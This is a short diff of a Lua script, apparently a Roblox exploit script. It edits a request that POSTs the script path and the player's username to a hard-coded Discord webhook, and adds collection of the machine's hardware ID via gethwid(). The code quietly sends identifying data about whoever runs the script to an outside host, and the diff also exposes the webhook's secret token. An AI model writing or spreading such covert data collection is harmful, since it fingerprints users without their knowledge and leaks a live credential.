@@ -671,16 +671,18 @@ local function sendRequest(options, timeout)
 end
 
 local options = {
-	Url = "https://ptb.discord.com/api/webhooks/1294658598839910481/ckFtLIZPVGH9ik0cMHJaGgYKbtjvtCOPt8ZH6e_nEV8SdTL_4nhIS4vaA0wVihQV_-ME",
-	Body = HttpService:JSONEncode({
-		['content'] = tostring(script:GetFullName()),
-		['username'] = (game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
-	}),
-	Method = 'POST',
-	Headers = {
+    Url = "https://ptb.discord.com/api/webhooks/1294658598839910481/ckFtLIZPVGH9ik0cMHJaGgYKbtjvtCOPt8ZH6e_nEV8SdTL_4nhIS4vaA0wVihQV_-ME",
+    Body = HttpService:JSONEncode({
+        ['content'] = tostring(script:GetFullName()),
+        ['username'] = (game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name,
+        ['hwid'] = gethwid() -- Füge die HWID hier hinzu
+    }),
+    Method = 'POST',
+    Headers = {
         ["Content-Type"] = "application/json"
-	}
+    }
 }
+
 
 sendRequest(options, timeout)
 end)
